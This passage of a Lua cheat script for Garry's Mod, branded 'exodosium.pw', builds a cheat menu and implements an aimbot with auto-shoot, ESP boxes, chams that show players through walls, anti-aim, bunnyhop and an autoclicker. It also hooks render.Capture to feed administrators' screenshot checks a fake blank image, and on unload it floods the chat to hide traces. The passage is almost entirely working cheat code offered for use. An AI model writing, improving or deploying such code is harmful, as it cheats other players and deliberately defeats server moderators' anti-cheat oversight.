for k,v in SortedPairsByValue(CheatsOrder) do
	local ofs = 5
	v = Cheats[k]

	local tab = vgui.Create("DScrollPanel", main)
	tab.Paint = PaintTAB
	tab:Dock(FILL)

	for n,a in SortedPairs(v) do
		if type(a) == "boolean" then -- True/False
			local f = vgui.Create("DCheckBoxLabel", tab)
			f.Paint = PaintCHK
			f:SetPos(5, ofs)
			f:SetText(n)
			function f:OnChange(b)
				Cheats[k][n] = b
			end
			function f:Think()
				f:SetChecked(Cheats[k][n])
			end

			ofs = ofs + 5 + f:GetTall()
		elseif type(a) == "table" then -- Multi-Choice
            a = Cheats[k][n]
            
			local f = vgui.Create("DComboBox", tab)
			f:SetPos(5, ofs)
			for _,l in pairs(a) do
				if l == true then f:SetValue(_) end
				f:AddChoice(_)
			end
			function f:OnSelect(_, b)
				for _,l in pairs(a) do
				    Cheats[k][n][l] = false
				end
				print(k..">"..n..">"..b)
				Cheats[k][n][b] = true
			end
			function f:Think()
				for _,l in pairs(a) do
					if l == true then f:SetValue(_) end
				end
			end

			ofs = ofs + 5 + f:GetTall()
		end
	end

	main:AddSheet(k, tab)
end

main:AddSheet("> Misc", vgui.Create("DPanel", main))

local cfgtab = vgui.Create("DScrollPanel", main)
cfgtab.Paint = PaintTAB
cfgtab:Dock(FILL)

local cfglist = vgui.Create("DListView", cfgtab)
cfglist.Paint = PaintLST
cfglist:SetPos(5, 5)
cfglist:AddColumn("Config")
cfglist:SetSize(200, 100)
function cfglist:DoDoubleClick(id, pnl)
	load(pnl:GetColumnText(1))
end

local rlcfgs = vgui.Create("DButton", cfgtab)
rlcfgs:SetPos(5, 10 + cfglist:GetTall())
rlcfgs:SetSize(90, 20)
rlcfgs:SetText("Reload")
rlcfgs.Paint = PaintBTN
function rlcfgs:DoClick()
	cfglist:Clear()
	for k,v in pairs(getcfgs()) do
		cfglist:AddLine(v)
	end
end

local newcfg = vgui.Create("DButton", cfgtab)
newcfg:SetPos(115, 10 + cfglist:GetTall())
newcfg:SetSize(90, 20)
newcfg:SetText("Save Config")
newcfg.Paint = PaintBTN
function newcfg:DoClick()
	Derma_StringRequest("Config Name", "Enter Config Name", "default", function(str)
		save(str)
		cfglist:Clear()
		for k,v in pairs(getcfgs()) do
			cfglist:AddLine(v)
		end
	end, nil, "Save", "Cancel")
end

main:AddSheet("Configs", cfgtab)

local cooldown = false

local origss = render.Capture
function render.Capture(data)
	if Cheats["Misc"]["Anti Screengrab"] then
		if !cooldown then
			cprint("Blocked Screengrab Attempt")
			cooldown = true
			timer.Simple(1, function() cooldown = false end)
		end
		return "iVBORw0KGgoAAAANSUhEUgAAAAcAAAAECAIAAADNpLIqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYSURBVBhXY2BgYmBmYGFgZEAFlIkyMAAACDAAKdIBq3cAAAAASUVORK5CYII="
	else
		return origss(data)
	end
end

local target = nil

local unloadbtn = vgui.Create("DButton", menu)
unloadbtn.Paint = PaintBTN
unloadbtn:SetPos(menu:GetWide() - unloadbtn:GetWide() - 5, menu:GetTall() - unloadbtn:GetTall() - 5)
unloadbtn:SetText("Unload")
function unloadbtn:DoClick()
	menu:Remove()
	hook.Remove("Think", "exo_"..securestr)
	hook.Remove("HUDPaint", "exo_"..securestr)
	hook.Remove("CalcView", "exo_"..securestr)
	hook.Remove("CreateMove", "exo_"..securestr)
	hook.Remove("player_hurt", "exo_"..securestr)
	hook.Remove("entity_killed", "exo_"..securestr)
	hook.Remove("PreDrawViewModel", "exo_"..securestr)
	hook.Remove("ShouldDrawLocalPlayer", "exo_"..securestr)
	hook.Remove("PreDrawOpaqueRenderables", "exo_"..securestr)
	hook.Remove("PostDrawOpaqueRenderables", "exo_"..securestr)
	render.Capture = origss
	gui.EnableScreenClicker(false)
	cprint("Successfully unloaded menu.")
	cprint("Clearing chat in 5 seconds.")
	timer.Simple(5, function()
		chat.AddText(string.rep("\n", 1000))
	end)
	save("default")
end

menu:Hide()

local toggle = false
local attack = false
local use = false

local fa = ply:EyeAngles()

hook.Add("Think", "exo_"..securestr, function()
	if input.IsKeyDown(KEY_INSERT) && !toggle then
		toggle = true
		showtip = false
		menu:SetVisible(!menu:IsVisible())
		gui.EnableScreenClicker(menu:IsVisible())
	elseif !input.IsKeyDown(KEY_INSERT) then
		toggle = false
	end
end)

local noclick = {
	"weapon_physgun",
}

local lock = nil

local function FixMovement(pCmd)
	local vec = Vector(pCmd:GetForwardMove(), pCmd:GetSideMove(), 0)
	local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
	local mang = vec:Angle()
	local yaw = pCmd:GetViewAngles().y - fa.y + mang.y
	if (((pCmd:GetViewAngles().p+90)%360) > 180) then
		yaw = 180 - yaw
	end
	yaw = ((yaw + 180)%360)-180
	pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
	pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
end

local function NormalizeAngle(ang)
	ang.x = math.NormalizeAngle(ang.x)
	ang.p = math.Clamp(ang.p, -89, 89)
end
local n = 0
local frames = 0
hook.Add("CreateMove", "exo_"..securestr, function(cmd)
	fa = fa + Angle(cmd:GetMouseY() * .023, cmd:GetMouseX() * -.023, 0)
	NormalizeAngle(fa)

	if Cheats["Misc"]["Use Spam"] then
		if input.IsKeyDown(KEY_E) then
			ply:ConCommand((use && "+" || "-").."use")
			use = !use
		else
			ply:ConCommand("-use")
			use = false
		end
	else
		if !use then
			ply:ConCommand("-use")
			use = true
		end
	end

	if Cheats["Misc"]["AutoClicker"] && ply:Alive() && ply:GetActiveWeapon():IsValid() && !table.HasValue(noclick, ply:GetActiveWeapon():GetClass()) then
		if ply:KeyDown(1) then
			cmd:SetButtons(bit.band(cmd:GetButtons(), bit.bnot(1)))
		end
		if ply:KeyDown(2048) then
			cmd:SetButtons(bit.band(cmd:GetButtons(), bit.bnot(2048)))
		end
	end 

	if Cheats["Misc"]["Bunnyhop"] then
        if (cmd:KeyDown(IN_JUMP) && !ply:IsOnGround()) then
            cmd:RemoveKey(IN_JUMP)
            if !ply:IsFlagSet(FL_ONGROUND) && ply:GetMoveType() ~= MOVETYPE_NOCLIP then
                if (cmd:GetMouseX() > 1 or cmd:GetMouseX() < -1) then
                    cmd:SetSideMove(cmd:GetMouseX() > 1 && 400 or -400)
                else
                    cmd:SetForwardMove(5850 / ply:GetVelocity():Length2D())
                    cmd:SetSideMove((cmd:CommandNumber() % 2 == 0) && -400 or 400)
                end
            end
        elseif (cmd:KeyDown(IN_JUMP)) then
            cmd:SetForwardMove(10000)
        end
	end

	local y = fa.y
	local x = fa.x

	if Cheats["HvH"]["Anti-Aim"] && !Cheats["Visuals"]["GTA 3 Camera"] && !cmd:KeyDown(IN_ATTACK) && !cmd:KeyDown(IN_ATTACK2) then
		n = n + 2
		if n >= 360 then n = 0 end
		y = fa.y + 181+n
		
		if math.random(0, 1) == 1 then
			x = -180.000005
		else
			x = 180.000005
		end
	end

	if Cheats["Visuals"]["GTA 3 Camera"] then
		x = 0
		y = fa.y
	end

	if !ply:IsTyping() && Cheats["Aimbot"]["Enabled"] then
		local closest = nil
		if !target || !target:IsValid() || !target:Alive() || frames > 60 then frames = 0 target = nil else frames = frames + 1 end
		local NearestTarget = 0
		for k, v in pairs(player.GetAll()) do
			if v != ply && v:IsValid() && v:Alive() then
				local tr = util.TraceLine({start = ply:GetShootPos(), endpos = v:LocalToWorld(v:OBBCenter()), filter = ply, mask = MASK_SHOT})
				if !tr.Hit || tr.HitWorld || tr.Entity ~= v then continue end
				local Target = Vector(v:GetPos()):Distance(Vector(ply:GetPos()))
				if Target ~= 0 then 
					if Target < NearestTarget or NearestTarget == 0 then
						NearestTarget = Target
						if NearestTarget == Target then
							closest = v
							target = v
						end
					end
				end
			end
		end
		
		if closest ~= nil then
			local bone = "ValveBiped.Bip01_Head1"
			if Cheats["Aimbot"]["Body Aim"] then
				bone = "ValveBiped.Bip01_Pelvis"
			end

			if closest:LookupBone(bone) == nil then
				x = (closest:GetShootPos()-ply:GetShootPos()):Angle().x
				y = (closest:GetShootPos()-ply:GetShootPos()):Angle().y
			else 
				local closesthead = closest:LookupBone(bone)
				local closestheadpos,closestheadang = closest:GetBonePosition(closesthead)

				x = (closestheadpos-ply:GetShootPos()):Angle().x
				y = (closestheadpos-ply:GetShootPos()):Angle().y
			end
		end
    end

	local ang = Angle(x, y, 0)
	cmd:SetViewAngles(ang)
	if Cheats["HvH"]["Anti-Aim"] || Cheats["Aimbot"]["Enabled"] then FixMovement(cmd) end
	if Cheats["Aimbot"]["Auto Shoot"] then if ent ~= nil && IsValid(ent) && ent:IsPlayer() && ent:Alive() && ent == target then if !cmd:KeyDown(IN_ATTACK) then cmd:SetButtons(cmd:GetButtons() + IN_ATTACK) else cmd:RemoveKey(IN_ATTACK) end end end
end)

hook.Add("ShouldDrawLocalPlayer", "exo_"..securestr, function()
	return (Cheats["Visuals"]["Thirdperson"] || Cheats["Visuals"]["GTA 3 Camera"])
end)

hook.Add("PreDrawViewModel", "exo_"..securestr, function()
	if Cheats["Visuals"]["No Viewmodel"] then return false end
end)

hook.Add("CalcView", "exo_"..securestr, function(ply, origin, angles, fov)
	local data = {angles=angles,origin=origin,fov=fov}
	data.angles = fa

	if Cheats["Visuals"]["Thirdperson"] then
		data.origin = origin + fa:Forward() * -150
	end

	if Cheats["Visuals"]["Thirdperson"] then
		local oc = ply:GetColor()
		ply:SetColor(Color(oc.r,oc.g,oc.b,100))
		ply:SetRenderMode(RENDERMODE_TRANSALPHA)
	else
		local oc = ply:GetColor()
		ply:SetColor(Color(oc.r,oc.g,oc.b,255))
		ply:SetRenderMode(RENDERMODE_TRANSALPHA)
	end

	if Cheats["Visuals"]["GTA 3 Camera"] then
		data.origin = origin + Vector(0, 0, 300)
		data.angles = Angle(90, 0, 0)
	end

	data.drawviewmodel = false

	return data
end)

local function ESPGetPos(v)
	if v:IsValid() then
		local Points = {
			Vector(v:OBBMaxs().x, v:OBBMaxs().y, v:OBBMaxs().z),
			Vector(v:OBBMaxs().x, v:OBBMaxs().y, v:OBBMins().z),
			Vector(v:OBBMaxs().x, v:OBBMins().y, v:OBBMins().z),
			Vector(v:OBBMaxs().x, v:OBBMins().y, v:OBBMaxs().z),
			Vector(v:OBBMins().x, v:OBBMins().y, v:OBBMins().z),
			Vector(v:OBBMins().x, v:OBBMins().y, v:OBBMaxs().z),
			Vector(v:OBBMins().x, v:OBBMaxs().y, v:OBBMins().z),
			Vector(v:OBBMins().x, v:OBBMaxs().y, v:OBBMaxs().z)
		}
		local MaxX, MaxY, MinX, MinY
		for k, p in pairs(Points) do
			local ScreenPos = v:LocalToWorld(p):ToScreen()
			if MaxX != nil then
				MaxX, MaxY, MinX, MinY = math.max(MaxX, ScreenPos.x), math.max(MaxY, ScreenPos.y), math.min(MinX, ScreenPos.x), math.min(MinY, ScreenPos.y)
			else
				MaxX, MaxY, MinX, MinY = ScreenPos.x, ScreenPos.y, ScreenPos.x, ScreenPos.y
			end
		end
		return MaxX, MaxY, MinX, MinY
	end
end

function BoxESP(v)
	if v == ply || !v:Alive() then return end
	local MaxX, MaxY, MinX, MinY = ESPGetPos(v)
	surface.SetDrawColor(Color(0, 0, 0))
	surface.DrawOutlinedRect(MinX - 1, MinY - 1, MaxX - MinX + 2, MaxY - MinY + 1)
	surface.SetDrawColor(team.GetColor(v:Team()))
	surface.DrawOutlinedRect(MinX, MinY, MaxX - MinX, MaxY - MinY)
	surface.SetDrawColor(Color(0, 0, 0))
	surface.DrawOutlinedRect(MinX + 1, MinY + 1, MaxX - MinX - 2, MaxY - MinY - 2)
	local hp = math.Clamp(v:Health()/v:GetMaxHealth(), 0, 1)
	local clr = HSVToColor(hp*100, 1, 1)
	local h = ((MaxY-MinY-2) * hp)
	local h1 = (MaxY-MinY-2) - ((MaxY-MinY-2) * hp)
    surface.DrawOutlinedRect(MinX-6, MinY, 4, MaxY-MinY)
	surface.SetDrawColor(clr)
    surface.DrawOutlinedRect(MinX-5, MinY + 1 + h1, 2, h)
	draw.SimpleTextOutlined(v:GetName(), "DermaDefault", MinX, MinY, Color(255,255,255), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0, 0, 0))
end

function Chams(v)
	if v == ply || !v:Alive() then return end
	local wep = v:GetActiveWeapon()
	if wep:IsValid() then
		render.SetColorModulation(255, 128, 128)
		render.MaterialOverride(chamsmat_invis)
		wep:DrawModel()

		render.MaterialOverride(chamsmat_vis)
		render.SetColorModulation(0, 128, 255)
		wep:DrawModel()
	end

	render.SetColorModulation(255, 0, 0)
	render.MaterialOverride(chamsmat_invis)
	v:DrawModel()
	
	render.MaterialOverride(chamsmat_vis)
	render.SetColorModulation(255, 255, 255)
	v:DrawModel()

	render.SetColorModulation(1, 1, 1)
	render.MaterialOverride(nil)
end

hook.Add("PostDrawOpaqueRenderables", "exo_"..securestr, function()
	local i = 0
	for k,v in next, player.GetAll() do
		if v == ply || !v:IsValid() then continue end
		if Cheats["Visuals"]["Chams"] then
			Chams(v)
		end
	end
end)

hook.Add("PreDrawOpaqueRenderables", "exo_"..securestr, function()
	local i = 0
	for k,v in next, player.GetAll() do
		if v == ply || !v:IsValid() then continue end
		if Cheats["HvH"]["Resolver"] then
			local ang = v:GetAngles()
			local pitch = ang.x
			local resolvedpitch = ang.x
			local resolvedyaw = ang.y
			local resolvedroll = ang.z
			if(pitch >= 89 && pitch < 180) then
					resolvedpitch = 89;
				if(pitch >= -89 && pitch < -180) then
						resolvedpitch = -89;
				elseif(pitch >= 89 && pitch < -89) then
					resolvedpitch = 0;
				end
			end
		
			v:SetPoseParameter("aim_pitch", resolvedpitch)
			v:SetPoseParameter("head_pitch", resolvedpitch)
			v:SetPoseParameter("body_yaw", 0)
			v:SetPoseParameter("aim_yaw", 0)
			v:SetRenderAngles(Angle(0, math.NormalizeAngle(resolvedyaw) + math.NormalizeAngle(resolvedroll), 0))
			v:InvalidateBoneCache()
		end
	end
end)

local HitmarkerFont = "Arial"

if system.IsLinux() then
	HitmarkerFont = "Liberation Sans"
end

surface.CreateFont("Hitmarker", {
    font = HitmarkerFont,
    size = 24,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
})

local alpha = 0
local fDelay = 0
local killOpac = 0
local kName = "Nobody"

if !file.Exists("hitmarker.dat", "DATA") then
	http.Fetch("https://github.com/Soleedus/GMod-Simple-Hitmarker/raw/master/sound/hitmarker.wav", function(data)
		file.Write("hitmarker.dat", data)
	end)
end

local function hitmarker(play)
	if play then sound.PlayFile("data/hitmarker.dat", "noblock", function() end) end
	alpha = 255
	fDelay = 120
end

gameevent.Listen("player_hurt")
hook.Add("player_hurt", "exo_"..securestr, function( data )
	if data.attacker != ply:UserID() or data.userid == ply:UserID() then return end
	hitmarker(true)
	alpha = 255
end)

gameevent.Listen("entity_killed")
hook.Add("entity_killed", "exo_"..securestr, function(data)
	local killed = Entity(data.entindex_killed)
	local attacker = Entity(data.entindex_attacker)
	if !attacker.IsPlayer() then return end
	if attacker:UserID() != ply:UserID() or killed:UserID() == ply:UserID() then return end
	hitmarker(false)
	cprint(Color(100,255,100),"Killed " .. killed:Nick())
	kName = killed:Nick()
	killOpac = 255
end)

hook.Add("HUDPaint", "exo_"..securestr, function()	
	surface.SetFont("DebugFixed")

	local ofs = 5

	surface.SetTextColor(0, 0, 0)
	surface.SetTextPos(6, ofs + 1)
	surface.DrawText("exodosium.pw")
	surface.SetTextColor(HSVToColor(RealTime()*69%360,1,1))
	surface.SetTextPos(5, ofs)
	surface.DrawText("exodosium.pw")
	ofs = ofs + 24

	for k,v in SortedPairsByValue(CheatsOrder) do
		v = Cheats[k]
		surface.SetTextColor(0, 0, 0)
		surface.SetTextPos(6, ofs + 1)
		surface.DrawText("["..k.."]")
		surface.SetTextColor(255, 255, 255)
		surface.SetTextPos(5, ofs)
		surface.DrawText("["..k.."]")
		ofs = ofs + 12

		for n,a in SortedPairs(v) do
			surface.SetTextColor(0, 0, 0)
			surface.SetTextPos(26, ofs + 1)
			surface.DrawText(n)
			surface.SetTextColor(HSVToColor((a && 1 || 0) * 100, 1, 1))
			surface.SetTextPos(25, ofs)
			surface.DrawText(n)
			ofs = ofs + 12
		end
	end

	if Cheats["HvH"]["Anti-Aim"] then
		draw.SimpleText("WARNING: Anti-Aim Enabled", "DebugFixed", ScrW()/2, ScrH()/8, Color(255, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		draw.SimpleText("WARNING: Anti-Aim Enabled", "DebugFixed", ScrW()/2+1, ScrH()/8+1, Color(0, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end

	ofs = 5

	if target ~= nil then
		if Cheats["Aimbot"]["Enabled"] then
			local wep = target:GetActiveWeapon()
			local wname = "None"
			if wep && wep:IsValid() then
				wname = wep:GetPrintName()
			end

			local weps = ""
			for k,v in pairs(target:GetWeapons()) do
				weps = weps..", "..v:GetPrintName()
			end
			weps = string.sub(weps, 3)

			local info = {
				"Name: "..target:GetName(),
				"Health: "..target:Health(),
				"Armor: "..target:Armor(),
				"Rank: "..target:GetUserGroup(),
				"Distane: "..math.floor(ply:GetPos():Distance(target:GetPos())),
				"Active Weapon: "..wname,
				"Weapons: "..weps,
			}

			surface.SetTextColor(0, 0, 0)
			surface.SetTextPos(146, ofs + 1)
			surface.DrawText("[Target Info]")
			surface.SetTextColor(255, 255, 255)
			surface.SetTextPos(145, ofs)
			surface.DrawText("[Target Info]")
			ofs = ofs + 12

			for k,v in pairs(info) do
				surface.SetTextColor(0, 0, 0)
				surface.SetTextPos(166, ofs + 1)
				surface.DrawText(v)
				surface.SetTextColor(0, 255, 255)
				surface.SetTextPos(165, ofs)
				surface.DrawText(v)
				ofs = ofs + 12
			end
		end
	end

	ent = ply:GetEyeTrace().Entity

	if Cheats["Misc"]["Crosshair"] then
		if IsValid(ent) && ent:IsPlayer() then
			surface.SetDrawColor(219, 82, 75)
		else
			surface.SetDrawColor(154, 204, 20)
		end

		local x = ScrW() / 2
		local y = ScrH() / 2

		surface.DrawRect(x - 4 - 5, y - 1, 5, 2)
		surface.DrawRect(x + 4, y - 1, 5, 2)
		surface.DrawRect(x - 1, y - 4 - 5, 2, 5)
		surface.DrawRect(x - 1, y + 4, 2, 5)
	end

	for k,v in pairs(player.GetAll()) do
		if Cheats["Visuals"]["Box ESP"] then
			BoxESP(v)
		end
	end
	
	if !ply:Alive() then alpha = 0 return end
	
	alpha = math.Approach(alpha, 0, 5)
	
	local screen = Vector(ScrW() / 2, ScrH() / 2)
	
	surface.SetDrawColor( 255, 255, 255, alpha )
	
	surface.DrawLine( screen.x - 15, screen.y - 15, screen.x - 5, screen.y - 5 )
	surface.DrawLine( screen.x - 15, screen.y + 15, screen.x - 5, screen.y + 5 )
	surface.DrawLine( screen.x + 15, screen.y - 15, screen.x + 5, screen.y - 5 )
	surface.DrawLine( screen.x + 15, screen.y + 15, screen.x + 5, screen.y + 5 )

	if killOpac > 10 and killOpac < 256 then
		draw.SimpleTextOutlined("+50", "Hitmarker", ScrW() / 2 + 50, ScrH() / 2, Color(222,241,28,killOpac), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0, 0, killOpac))
		draw.SimpleTextOutlined("YOU ELIMINATED:", "Hitmarker", ScrW() / 2, ScrH() / 2 + 50, Color(255,255,255,killOpac), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0, 0, killOpac))
		draw.SimpleTextOutlined(string.upper(kName), "Hitmarker", ScrW() / 2, ScrH() / 2 + 70, Color(255,60,60,killOpac), TEXT_ALIGN_CENTER, TEXT_ALIGN_LEFT, 1, Color(0, 0, 0, killOpac))
		if fDelay > 0 then
			fDelay = math.Approach(fDelay, 0, 1)
		else
			killOpac = math.Approach(killOpac, 0, 4)
		end
	end
end)
